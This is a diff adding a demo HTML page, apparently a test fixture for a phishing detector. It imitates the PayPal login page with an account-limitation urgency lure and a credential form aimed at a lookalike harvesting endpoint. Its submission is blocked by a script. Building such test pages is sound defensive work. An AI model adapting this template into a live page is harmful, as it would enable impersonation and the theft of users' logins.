@@ -1,0 +1,32 @@
+<!doctype html>
+<!-- PhishNetra DEMO: a deliberately phishing-like page for testing. The form never submits anywhere. -->
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>PayPal: Log in to your account</title>
+  <style>
+    body { font-family: Helvetica, Arial, sans-serif; background: #f5f7fa; display: flex; justify-content: center; padding-top: 60px; }
+    .box { background: #fff; width: 360px; padding: 36px; border-radius: 10px; box-shadow: 0 2px 12px #0001; text-align: center; }
+    .logo { font-size: 30px; font-weight: 800; color: #003087; font-style: italic; margin-bottom: 20px; }
+    .logo span { color: #009cde; }
+    input { width: 100%; box-sizing: border-box; padding: 13px; margin: 6px 0; border: 1px solid #ccc; border-radius: 5px; font-size: 15px; }
+    button { width: 100%; padding: 13px; border: 0; border-radius: 22px; background: #0070ba; color: #fff; font-weight: 700; font-size: 15px; margin-top: 10px; }
+    .warn { color: #b91c1c; font-size: 13px; margin-bottom: 12px; }
+    a { color: #0070ba; font-size: 13px; }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="logo">Pay<span>Pal</span></div>
+    <p class="warn">Your account has been limited. Verify your identity within 24 hours to avoid suspension.</p>
+    <form action="https://collect.secure-paypal-verify.top/gate.php" method="post" onsubmit="event.preventDefault(); alert('Demo only — nothing was sent.');">
+      <input type="hidden" name="session" value="a8f3c2e1">
+      <input type="email" name="email" placeholder="Email or mobile number">
+      <input type="password" name="password" placeholder="Password">
+      <button type="submit">Log In</button>
+    </form>
+    <p><a href="#">Having trouble logging in?</a></p>
+    <p><a href="#">Sign Up</a> · <a href="#">Privacy</a> · <a href="#">Legal</a></p>
+  </div>
+</body>
+</html>
